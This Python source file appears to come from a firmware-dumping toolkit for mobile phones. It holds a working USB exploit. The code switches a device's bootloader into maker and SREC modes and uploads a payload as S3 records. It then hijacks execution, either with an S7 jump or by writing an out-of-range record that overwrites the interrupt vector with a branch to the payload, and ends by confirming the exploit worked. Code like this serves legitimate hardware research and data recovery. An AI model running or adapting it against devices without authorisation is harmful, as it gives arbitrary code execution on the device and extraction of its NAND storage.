import struct
import time
import usb.core
import sys

from dump.dumper import Dumper
from util.payload_builder import PayloadBuilder


def make_srec_s3(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


def make_s7(dst):
    payload_sz = 1 + 4
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)

    assert len(payload) == payload_sz

    return "S7" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class ShSrecExploitCommon(Dumper):

    payload_file = None

    def parse_opts(self, opts):
        super().parse_opts(opts)

        self.usb_reset = opts.get("usb_reset", 0)
        self.payload_base = opts["payload_base"]
        self.fatal_err = opts.get("fatal_err", 0)
        self.usb_interrupt = opts.get("usb_interrupt", 0)
        self.usb_getch = opts["usb_getch"]
        self.f_usb_send = opts["usb_send"]
        self.usb_send_commit = opts["usb_send_commit"]

        self.nand_data = opts.get("nand_data", 0)
        self.nand_addr = opts.get("nand_addr", 0)
        self.nand_cmd = opts.get("nand_cmd", 0)

        self.onenand_addr = opts.get("onenand_addr", 0)

    def _read_fully(self, sz):
        data = b""
        while len(data) < sz:
            data += self.dev.read(0x82, 512)
        if sz != len(data):
            print("_read_fully: requested={} got={}".format(sz, len(data)))
            print("data dump => {}".format(data.hex()))
        assert len(data) == sz
        return data

    def execute(self, dev, output):
        self.output = output

        print("Enter maker mode...")

        # validate support for mode =0xC0
        data = bytearray(dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
        dev.read(0x81, 256)

        # set ep to mode 0xC0
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        dev.read(0x81, 256)

        # enter maker mode
        dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

        time.sleep(0.5)

        print("Enter srec mode...")
        dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

        time.sleep(0.5)

        while True:
            dev = None
            for vid, pid in [(0x04c5, 0x10ca), (0x045b, 0x0033), (0x045b, 0x0035), (0x045b, 0x004c)]:
                dev = usb.core.find(idVendor=vid, idProduct=pid)
                if dev is not None:
                    break

            if dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        print("Got srec mode, exploiting...", end="")
        sys.stdout.flush()

        self.dev = dev

        dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        handshake = bytearray(dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        payload = PayloadBuilder(self.payload_file).build(
            base=self.payload_base,
            fatal_err=self.fatal_err,
            usb_interrupt=self.usb_interrupt,
            usb_reset=self.usb_reset,
            usb_getch=self.usb_getch,
            usb_send=self.f_usb_send,
            usb_send_commit=self.usb_send_commit,
            nand_data=self.nand_data,
            nand_cmd=self.nand_cmd,
            nand_addr=self.nand_addr,
            onenand_addr=self.onenand_addr,
        )

        # align to 256k to cache burst
        payload += b"\x00" * (256 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec_s3(self.payload_base + x, payload[x:x+0x80])
            assert dev.write(3, data) == len(data)

        if self.usb_reset:
            dev.write(3, make_s7(self.payload_base))
            print("")

            print("Waiting for the device to disconnect...")
            while True:
                dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                if dev is None:
                    break
                time.sleep(0.01)
            print("Waiting for the device to reconnect...")
            while True:
                dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                if dev is not None:
                    time.sleep(1)
                    dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                    break
                time.sleep(0.01)
            self.dev = dev
        else:
            dev.write(3, make_srec_s3(0xFFFFFFFF, b"\xFF" + b"\x00" * 0x18 + struct.pack("<III", 0xe59ff000, 0xdeadbeef, self.payload_base)))

            # give a chance for our overwritten interrupt to hit
            for x in range(300):
                if x % 30 == 0:
                    sys.stdout.write("..")
                    sys.stdout.flush()
                dev.ctrl_transfer(0x80, 0x06, 0x0100, 0x00, 0x40)
                time.sleep(0.01)
            print("")

            # trigger jump to the runner payload
            dev.write(3, b"\xAA")

        # now communicating with out payload, check handshake
        dev.write(3, b"\x42")
        data = bytearray(self._read_fully(1))
        assert data == b"\x43"

        print("Exploit OK!")
